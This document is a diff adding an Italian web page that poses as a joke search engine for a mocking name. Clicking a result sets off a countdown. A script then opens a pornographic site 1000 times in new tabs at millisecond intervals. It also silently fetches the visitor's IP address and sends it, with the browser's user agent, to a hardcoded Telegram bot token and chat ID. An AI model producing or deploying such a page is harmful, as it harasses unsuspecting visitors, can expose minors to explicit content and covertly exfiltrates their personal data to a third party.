@@ -1,0 +1,294 @@
+<html lang="it">
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>Umberto Smerdaiuolo</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Product+Sans&display=swap" rel="stylesheet" />
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+  <style>
+    body {
+      font-family: 'Product Sans', Arial, sans-serif;
+      background: #f9fafb;
+      color: #202124;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    .vibrate {
+      animation: vibrate 0.1s linear infinite;
+    }
+    @keyframes vibrate {
+      0% {
+        transform: translate(0);
+      }
+      20% {
+        transform: translate(-2px, 2px);
+      }
+      40% {
+        transform: translate(-2px, -2px);
+      }
+      60% {
+        transform: translate(2px, 2px);
+      }
+      80% {
+        transform: translate(2px, -2px);
+      }
+      100% {
+        transform: translate(0);
+      }
+    }
+    /* Scrollbar for results */
+    #resultsList {
+      max-height: 70vh;
+      overflow-y: auto;
+      padding-right: 8px;
+    }
+    #resultsList::-webkit-scrollbar {
+      width: 8px;
+    }
+    #resultsList::-webkit-scrollbar-thumb {
+      background-color: #cbd5e1;
+      border-radius: 4px;
+    }
+    #resultsList::-webkit-scrollbar-track {
+      background: transparent;
+    }
+    /* Custom focus for links */
+    a:focus-visible {
+      outline: 3px solid #4285f4;
+      outline-offset: 2px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Home page -->
+  <main
+    class="flex-grow flex flex-col items-center justify-center px-6 sm:px-12 md:px-20 lg:px-32 xl:px-48 2xl:px-64"
+    id="home"
+  >
+    <h1 class="mb-12 text-6xl font-extrabold select-none" aria-label="Logo Umberto Smerdaiuolo">
+      <span class="text-blue-600">Um</span><span class="text-red-600">be</span><span class="text-yellow-400">rto</span> <span class="text-green-600">Sm</span><span class="text-red-600">er</span><span class="text-blue-600">da</span><span class="text-yellow-400">iu</span><span class="text-green-600">olo</span>
+    </h1>
+    <form
+      class="w-full max-w-3xl flex items-center rounded-full shadow-lg bg-white ring-1 ring-gray-300 hover:ring-blue-500 focus-within:ring-blue-600 transition-all duration-300"
+      id="searchForm"
+      role="search"
+      aria-label="Modulo di ricerca Umberto Smerdaiuolo"
+    >
+      <input
+        aria-label="Cerca Umberto Smerdaiuolo"
+        autocomplete="off"
+        class="flex-grow px-6 py-4 rounded-l-full text-lg text-gray-900 placeholder-gray-400 focus:outline-none focus:ring-0"
+        id="searchInput"
+        name="q"
+        placeholder="Cerca Umberto Smerdaiuolo"
+        required
+        spellcheck="false"
+        type="search"
+      />
+      <button
+        aria-label="Cerca"
+        class="flex items-center justify-center px-6 py-4 bg-blue-600 text-white rounded-r-full hover:bg-blue-700 focus:outline-none focus:ring-4 focus:ring-blue-400 transition"
+        type="submit"
+      >
+        <i class="fas fa-search text-lg"></i>
+      </button>
+    </form>
+    <p class="mt-6 text-sm text-gray-500 select-none">
+      Cerca il nome più famoso di sempre
+    </p>
+  </main>
+
+  <!-- Search results page -->
+  <section
+    class="hidden flex flex-col max-w-5xl mx-auto px-6 py-10 space-y-8"
+    id="results"
+    aria-live="polite"
+  >
+    <p class="text-gray-600 text-sm font-semibold tracking-wide" id="resultsCount"></p>
+    <div
+      class="space-y-8 overflow-y-auto max-h-[72vh] pr-4"
+      id="resultsList"
+      tabindex="0"
+      aria-label="Lista dei risultati di ricerca"
+    ></div>
+  </section>
+
+  <!-- Countdown overlay -->
+  <div
+    class="fixed inset-0 bg-black text-white flex flex-col items-center justify-center text-center p-6 hidden z-50 select-none"
+    id="countdownOverlay"
+    role="alertdialog"
+    aria-modal="true"
+    aria-labelledby="countdownTitle"
+    aria-describedby="countdownDesc"
+  >
+    <p class="text-5xl mb-6" id="countdownTitle" aria-live="assertive" aria-atomic="true">
+      🤭 Riceverai uno scherzetto
+    </p>
+    <p class="text-8xl font-extrabold tracking-widest" id="countdownTimer" aria-live="assertive" aria-atomic="true">
+      10
+    </p>
+  </div>
+
+  <script>
+    // Generate fake search results
+    function generateResults(query, count = 30) {
+      const results = [];
+      for (let i = 1; i <= count; i++) {
+        results.push({
+          title: `Umberto Smerdaiuolo - Risultato ${i}`,
+          url: `https://www.umbertosmerdaiuolo.fake/result-${i}`,
+          description: `Questo è un risultato fittizio numero ${i} per la ricerca "${query}". Tutti i risultati sono intitolati Umberto Smerdaiuolo.`,
+          thumbnail: `https://placehold.co/120x90?text=Immagine+${i}&font=Product+Sans&fontSize=14&textColor=4a5568&bg=edf2f7`,
+          alt: `Miniatura immagine fittizia numero ${i} con testo Immagine ${i} in stile Product Sans su sfondo chiaro`
+        });
+      }
+      return results;
+    }
+
+    const home = document.getElementById('home');
+    const resultsSection = document.getElementById('results');
+    const resultsList = document.getElementById('resultsList');
+    const resultsCount = document.getElementById('resultsCount');
+    const searchForm = document.getElementById('searchForm');
+    const searchInput = document.getElementById('searchInput');
+    const countdownOverlay = document.getElementById('countdownOverlay');
+    const countdownTimer = document.getElementById('countdownTimer');
+
+    // Show search results
+    function showResults(query) {
+      const results = generateResults(query, 30);
+      resultsCount.textContent = `Circa ${results.length.toLocaleString('it-IT')} risultati per "${query}"`;
+      resultsList.innerHTML = '';
+      results.forEach((result) => {
+        const resultItem = document.createElement('article');
+        resultItem.className =
+          'flex flex-col sm:flex-row items-start sm:items-center space-y-3 sm:space-y-0 sm:space-x-6 p-4 rounded-lg hover:bg-gray-50 transition cursor-pointer shadow-sm';
+
+        // Thumbnail container with subtle shadow and rounded corners
+        const thumb = document.createElement('img');
+        thumb.src = result.thumbnail;
+        thumb.alt = result.alt;
+        thumb.width = 120;
+        thumb.height = 90;
+        thumb.className =
+          'flex-shrink-0 rounded-md border border-gray-300 shadow-sm sm:shadow-md sm:hover:shadow-lg transition-shadow';
+
+        const content = document.createElement('div');
+        content.className = 'flex flex-col flex-grow';
+
+        const titleLink = document.createElement('a');
+        titleLink.href = result.url;
+        titleLink.textContent = result.title;
+        titleLink.className =
+          'text-blue-700 text-xl font-semibold hover:underline focus:outline-none focus:ring-2 focus:ring-blue-500 rounded';
+        titleLink.setAttribute('target', '_self');
+        titleLink.setAttribute('tabindex', '0');
+        titleLink.addEventListener('click', (e) => {
+          e.preventDefault();
+          triggerPrank();
+        });
+
+        const urlText = document.createElement('p');
+        urlText.textContent = result.url;
+        urlText.className =
+          'text-green-700 text-sm mb-1 truncate break-all select-text';
+
+        const desc = document.createElement('p');
+        desc.textContent = result.description;
+        desc.className = 'text-gray-700 text-base leading-relaxed';
+
+        content.appendChild(titleLink);
+        content.appendChild(urlText);
+        content.appendChild(desc);
+
+        resultItem.appendChild(thumb);
+        resultItem.appendChild(content);
+
+        resultsList.appendChild(resultItem);
+      });
+
+      home.classList.add('hidden');
+      resultsSection.classList.remove('hidden');
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+      searchInput.blur();
+    }
+
+    // Prank function
+    function triggerPrank() {
+      alert('🤭 Riceverai uno scherzetto');
+      countdownOverlay.classList.remove('hidden');
+      document.body.classList.add('vibrate');
+      let timeLeft = 10;
+      countdownTimer.textContent = timeLeft;
+
+      // Make page black background and white text
+      document.body.style.backgroundColor = 'black';
+      document.body.style.color = 'white';
+
+      const countdownInterval = setInterval(() => {
+        timeLeft--;
+        countdownTimer.textContent = timeLeft;
+        if (timeLeft <= 0) {
+          clearInterval(countdownInterval);
+          document.body.classList.remove('vibrate');
+          openManyPages();
+        }
+      }, 1000);
+    }
+
+    // Open 1000 pages at 1ms interval
+    function openManyPages() {
+      let count = 0;
+      const max = 1000;
+      const interval = setInterval(() => {
+        if (count >= max) {
+          clearInterval(interval);
+          return;
+        }
+        window.open('https://www.pornhub.com', '_blank');
+        count++;
+      }, 1);
+      sendTelegramNotification();
+    }
+
+    // Send Telegram notification with device info and IP
+    async function sendTelegramNotification() {
+      try {
+        // Get IP address
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const ip = ipData.ip || 'IP non disponibile';
+
+        // Get device info
+        const deviceModel = navigator.userAgent || 'Modello dispositivo non disponibile';
+
+        // Telegram bot info
+        const botToken = '7605005911:AAFGRr4k25QbRLOlxcT-6lb3riLB5iWlCjI';
+        const chatId = '5709299213';
+
+        const message = encodeURIComponent(
+          `📢 Scherzetto attivato!\nDispositivo: ${deviceModel}\nIP: ${ip}`
+        );
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+
+        await fetch(url);
+      } catch (e) {
+        // Fail silently
+      }
+    }
+
+    // Handle form submit
+    searchForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const query = searchInput.value.trim();
+      if (query.length > 0) {
+        showResults(query);
+      }
+    });
+  </script>
+</body>
+</html>
